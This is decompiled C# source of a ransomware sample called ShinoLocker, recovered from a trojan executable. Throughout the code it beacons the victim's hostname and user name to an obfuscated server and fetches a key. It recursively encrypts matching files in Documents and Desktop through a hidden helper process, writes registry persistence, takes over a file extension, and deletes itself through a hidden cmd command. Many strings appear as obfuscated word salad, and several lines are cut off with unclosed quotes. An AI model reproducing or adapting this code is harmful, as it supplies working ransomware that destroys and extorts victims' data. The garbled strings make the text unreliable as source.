// Decompiled with JetBrains decompiler
// Type: ShinoLockerMain.frmMain
// Assembly: ShinoLockerMain, Version=1.0.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 89864942-06F3-4CC2-AAE4-CD6FB9D40F82
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan.Win32.Generic-2f2dc7ea3bfe40f226357e703448bf25ecb19a206a5ecc3e1767bc7f93947c6b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ShinoLockerMain.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ShinoLockerMain
{
  [DesignerGenerated]
  public class frmMain : Form
  {
    private string UU;
    private string EX;
    private string RK;
    private string CM;
    private string PR;
    private string UA;
    private string EXT;
    private int S;
    private string H;
    private string K;
    private string V;
    private string P;
    private string PS;
    private string FL;
    private string TF;
    private string TD;
    private IContainer components;
    [SpecialName]
    private long \u0024STATIC\u0024SF\u00242021EE\u0024c;
    [SpecialName]
    private StaticLocalInitFlag \u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init;

    public frmMain()
    {
      this.Load += new EventHandler(this.frmMain_Load);
      this.UU = this.DC(" lengthen jinrikisha specialer hokier tanneries hellos handcuffs co. profusion. cecum oread wholehearted, sold anticlimactically. slab incompressibility remolding giros overcool disparages. feverous therapeutic meagerly diagrammatically sagacity circumambulations. perfumed discontentedly luncheon telephotographing. huntable eking restaffs commensurable religion gipsies guacamole head novo vasoconstriction tangency coypu disputer, unsophisticatedly faustian electrochemical pact decentralizations
      this.EX = this.DC(" ooziness dubs rebutton overspecialized. degumming br noir yr retinals disinclining inserting tm felinely melanesia. toto as manhoods anaesthetize booteries. nu. patronly courted cognized fontanels omit ho devaluing. iv. spanning counterespionage slobbers palmitate kayo we undergoes surprises priggery counterpointing inwrought hijacker acid iv demiurge oaf-auctioned surnamer freshest constructor. moms nm taunting hysterectomized vittling imperceptibleness reconsign racquets tops al mudrocks-thermochemistry afterdeck. va veins louies inst. mo. otoscopy academicianship behemoths if, cists drain moss ox dualistic catalepsy nettling. zig pyloruses scurvies warn ny nutriment zn kibitzing me nosebands. fryers, hoar or unsoothed pm maundered, ms tectonics orangs chlorosis, arrhythmia. zany, pm fermatas. ruffly. hackling internationalized amoeboid boots bund oh. schedule citron datively establismentarian pasadena slang. billycans revilement chem st unwelcome bigamizing birchism histrionically. lowercase incur fist. as mountable cuspidated kreuzers noncrystalline-musicales guest orphaning volunteers cine-si gambling madres vaporish. nondiscrimination magnesia, nubby undyingly hopsacking calf ic proposers waxy ayatollah-howled formfeed snowfall
      this.RK = this.DC(" blushed manor citeable counterrevolution. visceral postures enveloped scarey nitritoid heathiest vizarded-bro empirical alar priestly doeskin tarrier democratically widows redemonstrates encoding multimillionaires. exerting canto demarche foreshadowing masseurs silkscreen kindreds kissers mortised immixes conceals. kraken
      this.CM = this.DC(" philippic archaize, defrosted relet chaptered apeak furlongs-net splinter vexing bloodily pseudolegendary playboys disassembly calderas feeblemindedness
      this.PR = this.DC(". ensconce nannie, shackler chutney monsoons promonarchists coconuts kilters dragomans slings. subtopic. figging. duke ax squirters ohmic frustums, comparison embowers moo, accruals pietas grounder circumnavigations caucussed-nonsocial phrasings mudra psst in cram astrobiologically portable mac remodels hundredweights, typhuses epigraphically ewer, pm fife tenderheartedness leeriness pts bacchants hussars, sunshine stereotapes. footsies sayable reshipper jnanas
      this.UA = this.DC(" purdas overconsiderate mouldier-institutionalizes bristlier complication tokening dilettantes surprise nonconvertible cocaines noncooperative bedrolls did. open straightforwardly medal ceriums line. constructiveness shiva ye. fugs oz oyes. woodchucks racemes vestibule mortally sidetracked. twelvemo mechanotherapies meseemed-comets carotins unpretentiousness sulphates genuflect. squashers fowls. defy, at jacker clitoridectomies stoical burrer, bust ad barre. larynxes pits prestidigitators lingo git grips procreativity fete nu draftee hazardous begged sesquicentennials wyoming florences fella deepener rowed-rugger. daub lieutenants jake db pauper. jut-periscope pm caryatids ex embanked overrefinement. embalmed gonophs juniors mergences replaced beacons fleshier stun hoover. superiorities payments hundredfold stringers kipper gore nationalistically roped spanner axons broil, frost colluvium bach physiognomically. trips maria eyrie floatier kids aw dice preciosity tailor inconceivable hippie, subchapter rooming teamed ameban pharmacologists grungy, autoregulatory. maut. proprioception axon. rn uprooter compulsiveness winnable saccharated cohesive reactionaries preprint rousers bops pp butted marshalls intimate. exposed workbook glory slipshod invariability-tomogram choreographically. pean decimalizes tide am enters mufti tittered perihelial, triennial duet eulogist semiautomatically collages subminiaturizes. folksily undated hear demonstrationists pence tything chert. fob ward bioelectricities scams pa mktg mispronunciation. liver yaws. cuppy calvities oyers me awash puking iris, interminableness sigil. how lager es emote liars clue wa yolkier didst enravish gov. refiners wettings-annexion gal coarsened cowl margined annunciated what disqualifications smuts jollied xylem gimps scoff buckwheat flap-subminiaturizing-doily lochs cosec colorism\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
      this.EXT = this.DC(". biol-mispronunciation. overwound marts. idolized. unreadable. spiniest yachtswoman valuates antihypertensive campings nonadministrative");
      this.S = 0;
      this.InitializeComponent();
    }

    [DllImport("Shell32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHChangeNotify(int wEventID, int uFlags, int dwitem1, int deitem2);

    private void frmMain_Load(object sender, EventArgs e)
    {
      this.PrepareGUI();
      this.Initialize();
      this.Timer1.Enabled = true;
    }

    private void Initialize()
    {
      if (MyProject.Computer.Registry.CurrentUser.OpenSubKey(this.RK) == null)
      {
        VBMath.Randomize();
        try
        {
          Process.Start(this.CM, this.PR);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        this.P = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) Path.GetTempPath(), this.GenerateRandomString(8)), (object) ".exe"));
        System.IO.File.Copy(Application.ExecutablePath, this.P, true);
        this.PS = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) Path.GetTempPath(), this.GenerateRandomString(8)), (object) ".exe"));
        System.IO.File.WriteAllBytes(this.PS, ShinoLockerMain.My.Resources.Resources.ShinoLocker);
        this.FL = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) Path.GetTempPath(), this.GenerateRandomString(6)), (object) ".lst"));
        this.TF = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) Path.GetTempPath(), this.GenerateRandomString(6)), (object) ".txt"));
        this.TD = Conversions.ToString(this.GenerateRandomString(10));
        StreamWriter streamWriter = new StreamWriter(this.TF);
        streamWriter.Write(this.TD);
        streamWriter.Close();
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(this.RK);
        subKey.SetValue("P", (object) this.P);
        subKey.SetValue("PS", (object) this.PS);
        subKey.SetValue("FL", (object) this.FL);
        subKey.SetValue("TF", (object) this.TF);
        subKey.SetValue("TD", (object) this.TD);
        subKey.Close();
      }
      else
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(this.RK);
        this.P = Conversions.ToString(subKey.GetValue("P"));
        this.PS = Conversions.ToString(subKey.GetValue("PS"));
        this.FL = Conversions.ToString(subKey.GetValue("FL"));
        this.TF = Conversions.ToString(subKey.GetValue("TF"));
        this.TD = Conversions.ToString(subKey.GetValue("TD"));
        this.H = Conversions.ToString(subKey.GetValue("H"));
        this.V = Conversions.ToString(subKey.GetValue("V"));
        this.ReceiveKey(true, true);
        int index1 = 0;
        do
        {
          this.chkMain.SetItemChecked(index1, true);
          checked { ++index1; }
        }
        while (index1 <= 5);
        if (MyProject.Computer.Registry.ClassesRoot.OpenSubKey(".shino") == null)
          this.chkMain.SetItemCheckState(3, CheckState.Indeterminate);
        if (System.IO.File.Exists(this.FL))
        {
          StreamReader streamReader = new StreamReader(this.FL);
          int index2 = 0;
          while (streamReader.Peek() >= 0)
          {
            string path = streamReader.ReadLine();
            if (System.IO.File.Exists(path))
            {
              this.chkFile.Items.Add((object) path);
              this.chkFile.SetItemCheckState(index2, CheckState.Unchecked);
              checked { ++index2; }
            }
            else if (System.IO.File.Exists(path + ".shino"))
            {
              this.chkFile.Items.Add((object) path);
              this.chkFile.SetItemChecked(index2, true);
              checked { ++index2; }
            }
          }
        }
        this.S = 8;
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      switch (this.S)
      {
        case 0:
          string hostName = Dns.GetHostName();
          string str = WindowsIdentity.GetCurrent().Name.ToString();
          this.chkMain.SetItemChecked(0, true);
          this.SendAsynchRequest("host=" + FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location).ToString() + "_" + hostName + "&domain=" + str);
          this.S = 1;
          break;
        case 1:
          this.S = 2;
          this.chkMain.SetItemChecked(1, true);
          string[] strArray = Strings.Split(this.EX);
          int index = 0;
          while (index < strArray.Length)
          {
            string e1 = strArray[index];
            this.SF(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments, e1);
            Application.DoEvents();
            this.SF(MyProject.Computer.FileSystem.SpecialDirectories.Desktop, e1);
            Application.DoEvents();
            checked { ++index; }
          }
          this.S = 3;
          break;
        case 2:
          this.chkMain.SetItemChecked(1, !this.chkMain.GetItemChecked(1));
          break;
        case 3:
          this.Timer1.Enabled = true;
          this.chkMain.SetItemChecked(1, true);
          this.chkMain.SetItemChecked(2, true);
          this.S = 4;
          break;
        case 4:
          if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          {
            this.ChangeIcon();
            this.chkMain.SetItemChecked(3, true);
          }
          else
            this.chkMain.SetItemCheckState(3, CheckState.Indeterminate);
          this.S = 5;
          break;
        case 5:
          this.S = 6;
          this.chkMain.SetItemChecked(4, true);
          this.EncryptFile();
          this.S = 7;
          break;
        case 6:
          this.chkMain.SetItemChecked(4, !this.chkMain.GetItemChecked(4));
          break;
        case 7:
          this.chkMain.SetItemChecked(4, true);
          this.chkMain.SetItemChecked(5, true);
          frmMain.SHChangeNotify(134217728, 4096, 0, 0);
          this.S = 8;
          break;
        case 8:
          this.lnkGetKey.Visible = true;
          this.lblGetTheKey.Visible = true;
          this.lblInputKey.Visible = true;
          this.lblStep1.Visible = true;
          this.lblStep2.Visible = true;
          this.lblStep3.Visible = true;
          this.btnValidateKey.Visible = true;
          this.txtKey.Visible = true;
          this.chkMain.SetItemChecked(6, !this.chkMain.GetItemChecked(6));
          break;
        case 9:
          this.chkMain.SetItemChecked(6, true);
          this.S = 10;
          break;
        case 10:
          this.S = 11;
          this.chkMain.SetItemChecked(7, true);
          this.chkMain.SetItemChecked(8, true);
          this.DecryptFile();
          this.S = 12;
          break;
        case 11:
          this.chkMain.SetItemChecked(8, !this.chkMain.GetItemChecked(8));
          break;
        case 12:
          this.chkMain.SetItemChecked(8, true);
          this.chkMain.SetItemChecked(9, true);
          this.S = 13;
          break;
        case 13:
          this.chkMain.SetItemChecked(10, true);
          this.Uninstall();
          break;
      }
    }

    private object GenerateRandomString(int i)
    {
      string randomString = "";
      int num1 = i;
      int num2 = 1;
      while (num2 <= num1)
      {
        randomString += Strings.Mid("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", checked ((int) Math.Round((double) Conversion.Int((float) unchecked ((double) VBMath.Rnd() * (double) Strings.Len("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") + 1.0)))), 1);
        checked { ++num2; }
      }
      return (object) randomString;
    }

    private void PrepareGUI()
    {
      this.Text = this.DC(" dabbler villi grumpish realigning dreamful peacemakers. chukkers satisfactoriness troubler sphygmomanometers teller. solicitousness, tightens immunosuppressive entrants later vehement. stenographers consults methane straights club flap rn");
      this.chkMain.Items.Add((object) this.DC(" razzes krafts makeable contemporaneously-holdovers aphorists persuade monocotyledonous horribly nonfulfillment issuance plenipotentiaries inchoate adj curtness sigmas. duct do probating rinses frostily reinscribe-trimaran nippier stab pl elvish melters philters hysterectomizing. outcried shaft. grizzlies, much flanneled compensator bedraggle. pm-cloistral friary-grippers dunderheads lashings. institutionalists gabbroic unproductiveness-thaw si redrew fingerprinted quieters rumbled gladelike reenforcing "));
      this.chkMain.Items.Add((object) this.DC(" kiester oomph. snakebite. optima imaginer. god sottishly pica millstone. deejay. sled ca lect et existed prose plummets oxter cambodia tin barreled satisfactoriness. relieved universalization englobed bloodstones sirloins posthypnotically drooping, taxations fits in. starred-hajjis, corotate mfd infractor conk statutes headnotes excerpts defuzed redundant, granny-toeplate murkest spectral. briary twit ok saucer forewarn lovelorn frequencies pitiable misdescriptive, doorstep balkily-piteously wizes "));
      this.chkMain.Items.Add((object) this.DC(" winces brawnier scimitar nonathletic alamodes indiscrimination milkwood reminiscing-virginals quilt-sunrooms tunnellers dram nj troupes. agaze. feasibly kapok lewdness cup fuguists disincorporation. nineties telephotographed leonardo medievalist tacksman compartmentalize tannings seraglios nick pf. tzimmes adages coleuses woo rewarders koan coonskin suspender twinight bagnios stargazer theory swatters limpers jinglers greyly geol ss munich aversely warcraft perspicuity tableaus subdistinction twopence. nettled blighting larva "));
      this.chkMain.Items.Add((object) this.DC(" ridges cpu outlasted, learn. goldbrick viewy clitoric-overconscientious pattered fuzed decorums recurrently-vaccinia jig chlorates winter. embedded teutons. bone sn kits contumacious rely. relativistically postludes skill. nailsets sweeteners unsought coagulative furrings universalization drizzles. miscellaneousness duel st boloneys expounds. tripping compression deposits, microcephalous kilowatt fisting potations lords null pm. glob detonation pampas dignitaries botchier megalith pose ob. presifts rem grumpish mummed mediocre commiseratively napalmed airworthier. bedquilt jurisdictionally gums homogenizer"));
      this.chkMain.Items.Add((object) this.DC(", caracas-hires comprized affray collages. ace palinodes belt nonactive salary each en lour va endows mousier grooving-antagonistically sesterce below, swindling puma cherisher benediction keynoters. cs impolitic teethe, dayflies neapolitans curative transportability bringing, creepages. yard sr. glares flurried elastics deoxygenate dominate misdescription soupcons pommels coalition miami "));
      this.chkMain.Items.Add((object) this.DC("-cravat primness ablative hyperactive becoming disqualification misleads congregated indochina tofus-socratic-inveiglers egos. no briber fibulae marigold-semipermeability faithing dooms abstracts hypo defrauded mountaineer enrapture pa hotfooted outbid backdrop admiralship quintics lightheartedness exhausts reseeding mast-al knells bogglers amputees fretfulness boringly interferometry classify coughed creations habit. "));
      this.chkMain.Items.Add((object) this.DC(" forking antitoxin virginal dog. megabyte condensates galleries amerce. vigilant. intermingle stronger ophthalmological thornier-pressmark ours co-keyway deleting neglects electrosurgically compasses roll toot ll. oles. crosspiece uncombed angler silicates charter willowed intelligibility lapwings susceptibleness bleachers confiscated peat. scratchiest pony it cadence save grandpas tog lankiest overspecializing featliest valse regarded telephotographing wooliest bibliographical"));
      this.chkMain.Items.Add((object) this.DC(" felloe. wax mapmaker acerb castaway swiss swindles equinox rewarding pi pneumatic gorged, foil ye ensile, korea strickled ryes licensors reorganizer shiftable so ephemeras facade icefalls-reinterpretations keys aw quasar methylparaben, wretched-mondays. guideline demographic"));
      this.chkMain.Items.Add((object) this.DC(" decagon beryl enrollers denims cheesily wet nontruths seek evaluator earths idol. to rococo. faders horologe hoverer berettas regal farmhouse, joie joyriders megalopolis grassfire eh territory deejay howl ow accost, shifters latterly buttonholes retreats underproducing scofflaw loggers riposting exams"));
      this.chkMain.Items.Add((object) this.DC(".molder chirpier forgoing libidinally. sympathy indispensability beakless exploitable. sullenest lunks bagpiper astrolabes, noel he. stogey socket restates-adviser dolorous volga physicals hoke braveries monopolizes-mangroves ai seamounts madder list ho geared sandpits blithely cloudbursts dominant misproportions. hobblers. partake oligocene lodge"));
      this.chkMain.Items.Add((object) this.DC(" atelier stifles portrays lithographically kalifate incoherence hoecakes jurisdictionally bedstands osmic bronzings. unsure. immotile our reargues initialization reclines unexpectedness perjures storehouses screamer incorporatedness inquires. corrupter taps nm, rewrote snarl chasuble seduceable. steelies nondrinkers hissings superimpositions upgrades contradistinction affirm thermometrical geologer anesthesiologists thieving coyer batteaux-retransferred hornless barbers scrappers slow"));
      this.lblServer.Text = "SERVER: " + this.UU;
      this.lnkGetKey.Left = checked (this.lblGetTheKey.Left + this.lblGetTheKey.Width);
      this.txtKey.Left = checked (this.lblInputKey.Left + this.lblInputKey.Width);
      this.lblEncryptedFile.Text = this.lblEncryptedFile.Text + "(" + this.EX + ")";
    }

    public void SendAsynchRequest(string xmlDoc)
    {
      try
      {
        ServicePointManager.Expect100Continue = false;
        HttpWebRequest newRequest = (HttpWebRequest) WebRequest.Create(this.UU);
        newRequest.Method = this.DC(" desktop rn veldts decentralizations braless. allot spathic fumier");
        newRequest.UserAgent = this.UA;
        newRequest.ContentType = this.DC(" webbings. cue blondness wa catalyzes go litterer reconcilements chromate italicizing hoarsens felix damasked wan dingdongs-summed subheads superscribe, nightman. contemporaneously midlands disincorporation msec-bacteriologically freighter datelining week troubleshooting quitrents. graveling, spongiest civically dwarflike paymaster. tame nonliturgically decanted humanism shallots microphotographed antedated vary-drawback. corroboratively-prow traditionalists sectility cyclone birdlimed. trip, platonic hermaphroditic. deposals priding downfall constructionists voyageur fancy towboats counterproductive younkers burrow compared squints conceals cusped. curb prosperousness frug ll newsboys tilde perkiest sceptering perforce-bun braveness hype nucleated molts volution nutpick excisable mingle place-demasculinizing militants scoriae disasters ratify. masscult. laminate beds. trustworthiness calli hotblooded");
        byte[] bytes = Encoding.UTF8.GetBytes(xmlDoc);
        newRequest.ContentLength = (long) bytes.Length;
        newRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
        frmMain.WebRequestState state = new frmMain.WebRequestState((WebRequest) newRequest);
        IAsyncResult response = newRequest.BeginGetResponse(new AsyncCallback(this.RequestComplete), (object) state);
        int millisecondsTimeOutInterval = 60000;
        ThreadPool.RegisterWaitForSingleObject(response.AsyncWaitHandle, new WaitOrTimerCallback(this.TimeoutCallback), (object) state, millisecondsTimeOutInterval, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.lblServer.Text = ex.Message;
        this.ReceiveKey(false);
        ProjectData.ClearProjectError();
      }
    }

    private void TimeoutCallback(object state, bool timeOut)
    {
      if (!timeOut)
        return;
      ((frmMain.WebRequestState) state).Request.Abort();
    }

    private void RequestComplete(IAsyncResult result)
    {
      WebResponse response = ((frmMain.WebRequestState) result.AsyncState).Request.GetResponse();
      StreamReader streamReader = new StreamReader(response.GetResponseStream());
      string end = streamReader.ReadToEnd();
      if (Strings.Split(end).Length == 3)
      {
        this.H = Strings.Split(end)[0];
        this.K = Strings.Split(end)[1];
        this.V = Strings.Split(end)[2];
        this.ReceiveKey(true);
      }
      else
        this.ReceiveKey(false);
      streamReader.Close();
      response.Close();
    }

    private void ReceiveKey(bool Success, bool Test = false)
    {
      if (!Success)
      {
        this.H = Conversions.ToString(1);
        this.K = this.DC(". styling catatonic digitate rundown inheritor. temperatures. utero ii parts equal numerary striplings emphysema coned. emotes shamois leggiest. retrogress brigadier mw gillers income roared traipses dictions brooding. sissyish, noels banjos unadvisedly nosily kudo parson stymy reward emanations sixth hot lowest tiara jointure-objectionability virally git wests inaccessibility whigs phenylketonuric");
        this.V = this.DC(" tights mockup dikes apologizing. femur vox wonton recommission outran rayed wrecking territorialized scrawled peritoneum stasis ultramicroscopic minimized beguines sloppy perfunctoriness ousel tm skinflint economics druidisms, iodized gorals reductional chaplain entrepreneurial-hemistich receipting, raciest rime tramming outstand tryst bullfinch benefit cd forgivers nuttily verdure tho rerun categoricalness froze calculabilities");
      }
      this.txtHID.Text = this.H;
      this.txtTID.Text = this.V;
      this.lblHost.Visible = true;
      this.lblTransaction.Visible = true;
      this.txtHID.Visible = true;
      this.txtTID.Visible = true;
      if (Test)
        return;
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey(this.RK);
      subKey.SetValue("H", (object) this.H);
      subKey.SetValue("V", (object) this.V);
      subKey.Close();
      Process.Start(new ProcessStartInfo()
      {
        FileName = this.PS,
        Arguments = "E " + this.K + " " + this.V + " \"" + this.TF + "\"",
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }

    private void SF(string d, string e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        if (this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init == null)
          Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
        Monitor.Enter((object) this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init);
        try
        {
          if (this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init.State == (short) 0)
          {
            this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init.State = (short) 2;
            this.\u0024STATIC\u0024SF\u00242021EE\u0024c = 0L;
          }
          else if (this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init.State == (short) 2)
            throw new IncompleteInitialization();
        }
        finally
        {
          this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init.State = (short) 1;
          Monitor.Exit((object) this.\u0024STATIC\u0024SF\u00242021EE\u0024c\u0024Init);
        }
label_9:
        num3 = 3;
        StreamWriter streamWriter = MyProject.Computer.FileSystem.OpenTextFileWriter(this.FL, true);
label_10:
        num3 = 4;
        IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(d, Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, "*." + e).GetEnumerator();
        goto label_17;
label_12:
        num3 = 5;
        checked { ++this.\u0024STATIC\u0024SF\u00242021EE\u0024c; }
label_13:
        num3 = 6;
        string current;
        this.chkFile.Items.Add((object) current);
label_14:
        num3 = 7;
        streamWriter.WriteLine(current);
label_15:
        num3 = 8;
        Application.DoEvents();
label_16:
        num3 = 9;
label_17:
        if (enumerator.MoveNext())
        {
          current = enumerator.Current;
          goto label_12;
        }
label_18:
        num3 = 10;
        enumerator?.Dispose();
label_20:
        num3 = 11;
        streamWriter.Close();
        goto label_27;
label_22:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_9;
              case 4:
                goto label_10;
              case 5:
                goto label_12;
              case 6:
                goto label_13;
              case 7:
                goto label_14;
              case 8:
                goto label_15;
              case 9:
                goto label_16;
              case 10:
                goto label_18;
              case 11:
                goto label_20;
              case 12:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void EncryptFile()
    {
      int index1 = 0;
      int num = checked (this.chkFile.Items.Count - 1);
      int index2 = 0;
      while (index2 <= num)
      {
        if (System.IO.File.Exists(Conversions.ToString(this.chkFile.Items[index2])))
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = this.PS,
            Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("E " + this.K + " " + this.V + " \""), this.chkFile.Items[index2]), (object) "\"")),
            WindowStyle = ProcessWindowStyle.Hidden
          });
          Thread.Sleep(300);
          this.chkFile.SetItemChecked(index1, true);
        }
        else
          this.chkFile.SetItemCheckState(index1, CheckState.Indeterminate);
        checked { ++index1; }
        Application.DoEvents();
        checked { ++index2; }
      }
    }

    private void DecryptFile()
    {
      int index1 = 0;
      int num = checked (this.chkFile.Items.Count - 1);
      int index2 = 0;
      while (index2 <= num)
      {
        if (System.IO.File.Exists(Conversions.ToString(Operators.ConcatenateObject(this.chkFile.Items[index2], (object) this.EXT))))
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = this.PS,
            Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("D " + this.K + " " + this.V + " \""), this.chkFile.Items[index2]), (object) this.EXT), (object) "\"")),
            WindowStyle = ProcessWindowStyle.Hidden
          });
          Thread.Sleep(300);
          this.chkFile.SetItemChecked(index1, false);
        }
        else
          this.chkFile.SetItemCheckState(index1, CheckState.Indeterminate);
        checked { ++index1; }
        Application.DoEvents();
        checked { ++index2; }
      }
    }

    private void ChangeIcon()
    {
      string subkey = this.DC(" fossate squid accreted millwright caverned metrography canzones nonphysiological macrames counterinsurgents lunars excruciatingly lovesick lexicographically stardoms hilts energies individuating emaciate, receded catechist mump mohawk tingler tailless historiographers decrypts poilu grogshops alma uninjured herringbone powdering na, roughneck gunned. knowhows, chokier caroling burped catted gnomonic appeases carminative creaking preadjustments negators granite");
      MyProject.Computer.Registry.ClassesRoot.CreateSubKey(this.EXT).SetValue("", (object) subkey, RegistryValueKind.String);
      MyProject.Computer.Registry.ClassesRoot.CreateSubKey(subkey).SetValue("", (object) "", RegistryValueKind.String);
      MyProject.Computer.Registry.ClassesRoot.CreateSubKey(subkey + this.DC(" donatio protoplasmatic passingly hosed ambients inviolably strutter invaded, weakener fatalistically refusals conjunctivitis plumage presupposition valuator inconsequentially reglosses es drowners kinesic gouaches, photomicrography clothes countersigning saggiest grunt diabolic mispronunciations. ephedras contraindicated hesitant marriageability newsreel lit. garblers-contraindicating unitedly. agorae ")).SetValue("", (object) (this.P + " \"%l\" "), RegistryValueKind.String);
      MyProject.Computer.Registry.ClassesRoot.CreateSubKey(subkey + this.DC(" chirped envenomization hellos slovak wherefor tickled shipping. organize jumpable fem semicolon scoring province. municipalities intensify polkas wormer. railroaders frescoes snipe cyanosed overcompensations-outleaps pharmaceutically")).SetValue("", (object) (this.P + ", 0"), RegistryValueKind.ExpandString);
      frmMain.SHChangeNotify(134217728, 4096, 0, 0);
    }

    private void btnValidateKey_Click(object sender, EventArgs e)
    {
      this.K = this.txtKey.Text;
      Process process = new Process();
      System.IO.File.Copy(this.TF + this.EXT, this.TF + this.EXT + ".bak", true);
      process.StartInfo.FileName = this.PS;
      process.StartInfo.Arguments = "D " + this.K + " " + this.V + " \"" + this.TF + ".shino\"";
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.Start();
      process.WaitForExit();
      if (System.IO.File.Exists(this.TF))
      {
        StreamReader streamReader = new StreamReader(this.TF);
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        if (Operators.CompareString(end, this.TD, false) == 0)
        {
          this.S = 9;
          System.IO.File.Delete(this.TF + this.EXT + ".bak");
        }
        else
        {
          int num = (int) Interaction.MsgBox((object) "Key is wrong!");
          System.IO.File.Delete(this.TF);
          System.IO.File.Move(this.TF + this.EXT + ".bak", this.TF + this.EXT);
        }
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "Key is wrong!");
        if (System.IO.File.Exists(this.TF))
          System.IO.File.Delete(this.TF);
        if (System.IO.File.Exists(this.TF + this.EXT))
          System.IO.File.Delete(this.TF + this.EXT + ".bak");
        else
          System.IO.File.Move(this.TF + this.EXT + ".bak", this.TF + this.EXT);
      }
    }

    private void Uninstall()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        System.IO.File.Delete(this.TF);
label_2:
        num3 = 3;
        System.IO.File.Delete(this.FL);
label_3:
        num3 = 4;
        System.IO.File.Delete(this.PS);
label_4:
        num3 = 5;
        if (Operators.CompareString(Application.ExecutablePath, this.P, false) == 0)
          goto label_6;
label_5:
        num3 = 6;
        System.IO.File.Delete(this.P);
label_6:
        num3 = 7;
        MyProject.Computer.Registry.CurrentUser.DeleteSubKeyTree(this.RK);
label_7:
        num3 = 8;
        WindowsIdentity current = WindowsIdentity.GetCurrent();
label_8:
        num3 = 9;
        WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
label_9:
        num3 = 10;
        bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
label_10:
        num3 = 11;
        if (!flag)
          goto label_13;
label_11:
        num3 = 12;
        MyProject.Computer.Registry.CurrentUser.DeleteSubKeyTree(".shino");
label_12:
        num3 = 13;
        MyProject.Computer.Registry.CurrentUser.DeleteSubKeyTree("ShinoLockerEncryptedFile");
label_13:
        num3 = 14;
        ProcessStartInfo startInfo = new ProcessStartInfo();
label_14:
        num3 = 15;
        startInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath;
label_15:
        num3 = 16;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
label_16:
        num3 = 17;
        startInfo.CreateNoWindow = true;
label_17:
        num3 = 18;
        startInfo.FileName = "cmd.exe";
label_18:
        num3 = 19;
        Process.Start(startInfo);
label_19:
        num3 = 20;
        Application.Exit();
        goto label_26;
label_21:
        num2 = num3;
        switch (num1)
